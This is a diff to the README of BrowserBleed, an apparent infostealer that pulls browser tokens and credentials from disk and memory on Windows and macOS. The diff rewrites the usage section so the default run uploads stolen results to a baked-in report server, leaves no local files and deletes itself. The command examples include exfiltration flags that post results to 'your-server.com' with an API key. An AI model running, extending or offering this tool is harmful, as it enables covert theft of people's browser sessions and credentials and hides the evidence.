@@ -150,34 +150,42 @@ Both versions write two files to the same directory as the binary:
 
 ## Usage
 
+When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run — no flags needed. Results upload automatically and the binary deletes itself.
+
 ### Windows
 
 ```
-BrowserBleed.exe                                      # all browsers, disk + memory
-BrowserBleed.exe --browser chrome                     # target one browser
-BrowserBleed.exe --memory-only                        # skip disk extraction
-BrowserBleed.exe --disk-only                          # skip memory scraping
-BrowserBleed.exe --verify                             # verify tokens (makes outbound requests)
-BrowserBleed.exe --max-hits 500                       # raise memory hit cap per browser (default: 300)
-BrowserBleed.exe --out results.txt                    # custom output path
-BrowserBleed.exe --self-delete                        # delete exe after run (opsec)
-BrowserBleed.exe --exfil https://your-server.com \   # POST results to report server
-                 --exfil-key YOUR_API_KEY
+BrowserBleed.exe                        # run — auto-exfils, no local files, self-deletes
+BrowserBleed.exe --no-self-delete       # keep the exe after run
+BrowserBleed.exe --out results.txt      # write local file instead of temp (still exfils)
+BrowserBleed.exe --browser chrome       # target one browser
+BrowserBleed.exe --memory-only          # skip disk extraction
+BrowserBleed.exe --disk-only            # skip memory scraping
+BrowserBleed.exe --verify               # verify tokens (makes outbound requests)
+BrowserBleed.exe --max-hits 500         # raise memory hit cap per browser (default: 300)
+```
+
+When running from source (no server baked in), add exfil manually:
+```
+python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ```
 
 ### macOS
 
 ```bash
-sudo ./BrowserBleed_mac                                          # all browsers, disk + memory
-sudo ./BrowserBleed_mac --browser chrome                         # target one browser
-sudo ./BrowserBleed_mac --memory-only                            # skip disk extraction
-sudo ./BrowserBleed_mac --disk-only                              # skip memory scraping
-sudo ./BrowserBleed_mac --verify                                 # verify tokens (makes outbound requests)
-sudo ./BrowserBleed_mac --max-hits 500                           # raise memory hit cap per browser (default: 300)
-sudo ./BrowserBleed_mac --out /tmp/results.txt                   # custom output path
-sudo ./BrowserBleed_mac --self-delete                            # delete binary after run (opsec)
-sudo ./BrowserBleed_mac --exfil https://your-server.com \        # POST results to report server
-                        --exfil-key YOUR_API_KEY
+sudo ./BrowserBleed_mac                        # run — auto-exfils, no local files, self-deletes
+sudo ./BrowserBleed_mac --no-self-delete       # keep the binary after run
+sudo ./BrowserBleed_mac --out /tmp/results.txt # write local file instead of temp (still exfils)
+sudo ./BrowserBleed_mac --browser chrome       # target one browser
+sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
+sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
+sudo ./BrowserBleed_mac --verify               # verify tokens (makes outbound requests)
+sudo ./BrowserBleed_mac --max-hits 500         # raise memory hit cap per browser (default: 300)
+```
+
+When running from source:
+```bash
+sudo python3 BrowserBleed_mac.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ```
 
 ---
